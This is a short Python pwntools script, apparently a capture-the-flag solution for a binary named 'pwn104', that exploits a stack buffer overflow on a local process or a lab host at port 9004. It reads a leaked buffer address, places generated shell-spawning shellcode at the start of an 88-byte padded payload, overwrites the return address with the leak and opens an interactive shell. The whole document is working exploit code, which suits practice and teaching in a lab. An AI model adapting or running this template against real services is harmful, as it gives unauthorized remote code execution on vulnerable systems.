from pwn import *

# 1. Setup binary and target environment
exe = './pwn104-1644300377109.pwn104'
elf = context.binary = ELF(exe, checksec=False)

# 2. Connection details for remote exploitation
host = '10.65.137.150' 
port = 9004

# 3. Choose execution mode (Local vs Remote)
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe)

# 4. Construct the Payload
# Receive data until the leak starts and extract the buffer address
p.recvuntil(b"at ")
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked Address: {hex(leak)}")

# Generate automated shellcode for a 64-bit shell
shellcode = asm(shellcraft.sh())

# Offset to reach the Return Address (RIP) is 88
offset = 88

# Building the payload: [Shellcode] + [Padding to fill the offset] + [Leaked Address]
payload = shellcode
payload += b"A" * (offset - len(shellcode))
payload += p64(leak)

# 5. Send the attack
# Use p.sendlineafter(b':', payload) if the program waits for a prompt
p.sendline(payload)

# 6. Final step: Get interactive shell access
p.interactive()